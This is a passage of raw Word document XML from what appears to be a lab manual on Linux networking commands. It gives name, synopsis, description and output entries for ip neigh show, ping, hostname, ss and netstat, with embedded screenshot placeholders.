        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E760F0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>OUTPUT:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E760F0">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays destination networks, gateways, and network interfaces used for routing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD882D7" w14:textId="181E8253" w:rsidR="00E760F0" w:rsidRPr="00421555" w:rsidRDefault="00C71EB5" w:rsidP="00421555">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="657A724E" wp14:editId="25801778">
            <wp:extent cx="5731510" cy="542925"/>
            <wp:effectExtent l="0" t="0" r="2540" b="9525"/>
            <wp:docPr id="1635725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7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="542925"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7173ECD0" w14:textId="77777777" w:rsidR="00037340" w:rsidRDefault="00037340" w:rsidP="00B8536F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45F411C9" w14:textId="77777777" w:rsidR="00C17D9D" w:rsidRPr="00C17D9D" w:rsidRDefault="00C17D9D" w:rsidP="00C17D9D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C17D9D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>13. ip neigh show</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F5B2E2D" w14:textId="77777777" w:rsidR="00C17D9D" w:rsidRPr="00C17D9D" w:rsidRDefault="00C17D9D" w:rsidP="00C17D9D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C17D9D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>NAME:</w:t>
      </w:r>
      <w:r w:rsidRPr="00C17D9D">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ip neigh show - displays the neighbor table.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28074C3E" w14:textId="77777777" w:rsidR="00C17D9D" w:rsidRPr="00C17D9D" w:rsidRDefault="00C17D9D" w:rsidP="00C17D9D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C17D9D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>SYNOPSIS:</w:t>
      </w:r>
      <w:r w:rsidRPr="00C17D9D">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ip neigh show</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B049C79" w14:textId="77777777" w:rsidR="00C17D9D" w:rsidRPr="00C17D9D" w:rsidRDefault="00C17D9D" w:rsidP="00C17D9D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C17D9D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DESCRIPTION:</w:t>
      </w:r>
      <w:r w:rsidRPr="00C17D9D">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays the neighbor cache, which stores mappings between IP addresses and link-layer addresses, such as MAC addresses.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AF39F68" w14:textId="77777777" w:rsidR="00C17D9D" w:rsidRPr="00C17D9D" w:rsidRDefault="00C17D9D" w:rsidP="00C17D9D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C17D9D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>OUTPUT:</w:t>
      </w:r>
      <w:r w:rsidRPr="00C17D9D">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays neighboring IP addresses, corresponding MAC addresses, and their reachability states.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D6634A" w14:textId="1B93AE35" w:rsidR="00C71EB5" w:rsidRDefault="00AF4961" w:rsidP="00B8536F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0B8EE8E5" wp14:editId="0489512B">
            <wp:extent cx="5344160" cy="723900"/>
            <wp:effectExtent l="0" t="0" r="8890" b="0"/>
            <wp:docPr id="15714673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8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5344160" cy="723900"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3230CE96" w14:textId="77777777" w:rsidR="00AF4961" w:rsidRDefault="00AF4961" w:rsidP="00B8536F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A614E66" w14:textId="77777777" w:rsidR="00AF4961" w:rsidRPr="00AF4961" w:rsidRDefault="00AF4961" w:rsidP="00AF4961">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AF4961">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>14. ping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42096D6E" w14:textId="77777777" w:rsidR="00AF4961" w:rsidRPr="00AF4961" w:rsidRDefault="00AF4961" w:rsidP="00AF4961">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AF4961">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>NAME:</w:t>
      </w:r>
      <w:r w:rsidRPr="00AF4961">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ping - checks network connectivity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EB7EEA6" w14:textId="77777777" w:rsidR="00AF4961" w:rsidRPr="00AF4961" w:rsidRDefault="00AF4961" w:rsidP="00AF4961">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AF4961">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>SYNOPSIS:</w:t>
      </w:r>
      <w:r w:rsidRPr="00AF4961">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ping &lt;hostname/IP&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714B4067" w14:textId="77777777" w:rsidR="00AF4961" w:rsidRPr="00AF4961" w:rsidRDefault="00AF4961" w:rsidP="00AF4961">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AF4961">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DESCRIPTION:</w:t>
      </w:r>
      <w:r w:rsidRPr="00AF4961">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Sends packets to the specified host to verify network connectivity and measure response times.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EF2910C" w14:textId="77777777" w:rsidR="00AF4961" w:rsidRPr="00AF4961" w:rsidRDefault="00AF4961" w:rsidP="00AF4961">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AF4961">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>OUTPUT:</w:t>
      </w:r>
      <w:r w:rsidRPr="00AF4961">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays replies from the destination, packet loss, and response-time statistics.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58056E18" w14:textId="77777777" w:rsidR="00AF4961" w:rsidRDefault="00AF4961" w:rsidP="00B8536F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="508289C1" w14:textId="77777777" w:rsidR="0045374E" w:rsidRDefault="0045374E" w:rsidP="00B8536F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="793BA470" w14:textId="56E39D81" w:rsidR="0045374E" w:rsidRDefault="0045374E" w:rsidP="00B8536F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="751E549F" wp14:editId="27A15425">
            <wp:extent cx="5731510" cy="2531745"/>
            <wp:effectExtent l="0" t="0" r="2540" b="1905"/>
            <wp:docPr id="1547505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9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="2531745"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="54A28C0D" w14:textId="77777777" w:rsidR="0045374E" w:rsidRDefault="0045374E" w:rsidP="00B8536F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03CD4AD5" w14:textId="77777777" w:rsidR="0045374E" w:rsidRPr="0045374E" w:rsidRDefault="0045374E" w:rsidP="0045374E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0045374E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>15. hostname</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75BC77DC" w14:textId="77777777" w:rsidR="0045374E" w:rsidRPr="0045374E" w:rsidRDefault="0045374E" w:rsidP="0045374E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0045374E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>NAME:</w:t>
      </w:r>
      <w:r w:rsidRPr="0045374E">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> hostname - displays the host name.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A4F32C0" w14:textId="77777777" w:rsidR="0045374E" w:rsidRPr="0045374E" w:rsidRDefault="0045374E" w:rsidP="0045374E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0045374E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>SYNOPSIS:</w:t>
      </w:r>
      <w:r w:rsidRPr="0045374E">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> hostname</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B5AC518" w14:textId="77777777" w:rsidR="0045374E" w:rsidRPr="0045374E" w:rsidRDefault="0045374E" w:rsidP="0045374E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0045374E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DESCRIPTION:</w:t>
      </w:r>
      <w:r w:rsidRPr="0045374E">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays the name of the local Linux computer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69197DFE" w14:textId="06B441D4" w:rsidR="0045374E" w:rsidRPr="0045374E" w:rsidRDefault="0045374E" w:rsidP="0024610F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0045374E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>OUTPUT:</w:t>
      </w:r>
      <w:r w:rsidRPr="0045374E">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays the system's host name.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B282997" w14:textId="5401B2AA" w:rsidR="0045374E" w:rsidRPr="005903BF" w:rsidRDefault="0024610F" w:rsidP="00B8536F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="603003BD" wp14:editId="2D0C5DA7">
            <wp:extent cx="2114550" cy="361950"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="328286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20"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2114550" cy="361950"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="25EC19E5" w14:textId="77777777" w:rsidR="00EC6302" w:rsidRDefault="00EC6302" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C94401B" w14:textId="77777777" w:rsidR="0024610F" w:rsidRPr="0024610F" w:rsidRDefault="0024610F" w:rsidP="0024610F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0024610F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>16. ss</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E6C18C2" w14:textId="77777777" w:rsidR="0024610F" w:rsidRPr="0024610F" w:rsidRDefault="0024610F" w:rsidP="0024610F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0024610F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>NAME:</w:t>
      </w:r>
      <w:r w:rsidRPr="0024610F">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ss - displays active network connections.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43FEB938" w14:textId="77777777" w:rsidR="0024610F" w:rsidRPr="0024610F" w:rsidRDefault="0024610F" w:rsidP="0024610F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0024610F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>SYNOPSIS:</w:t>
      </w:r>
      <w:r w:rsidRPr="0024610F">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ss [OPTION]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E14852B" w14:textId="77777777" w:rsidR="0024610F" w:rsidRPr="0024610F" w:rsidRDefault="0024610F" w:rsidP="0024610F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0024610F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DESCRIPTION:</w:t>
      </w:r>
      <w:r w:rsidRPr="0024610F">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays information about network sockets, including active connections, listening ports, and socket states.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="144584B6" w14:textId="77777777" w:rsidR="0024610F" w:rsidRDefault="0024610F" w:rsidP="0024610F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0024610F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>OUTPUT:</w:t>
      </w:r>
      <w:r w:rsidRPr="0024610F">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays network socket information and connection details.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="454CA2D9" w14:textId="6E782B96" w:rsidR="0024610F" w:rsidRPr="0024610F" w:rsidRDefault="00D83D4D" w:rsidP="0024610F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="132D09BD" wp14:editId="41DB4F08">
            <wp:extent cx="5731510" cy="2526030"/>
            <wp:effectExtent l="0" t="0" r="2540" b="7620"/>
            <wp:docPr id="1770716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21"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="2526030"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A2299E0" w14:textId="77777777" w:rsidR="0024610F" w:rsidRDefault="0024610F" w:rsidP="00303157">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F4615A6" w14:textId="77777777" w:rsidR="00FA09E1" w:rsidRPr="00FA09E1" w:rsidRDefault="00FA09E1" w:rsidP="00FA09E1">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA09E1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>17. netstat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB953E0" w14:textId="77777777" w:rsidR="00FA09E1" w:rsidRPr="00FA09E1" w:rsidRDefault="00FA09E1" w:rsidP="00FA09E1">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA09E1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>NAME:</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA09E1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> netstat - displays network statistics and connections.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D398A9" w14:textId="77777777" w:rsidR="00FA09E1" w:rsidRPr="00FA09E1" w:rsidRDefault="00FA09E1" w:rsidP="00FA09E1">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA09E1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-IN"/>
        </w:rPr>
        <w:t>SYNOPSIS:</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA09E1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
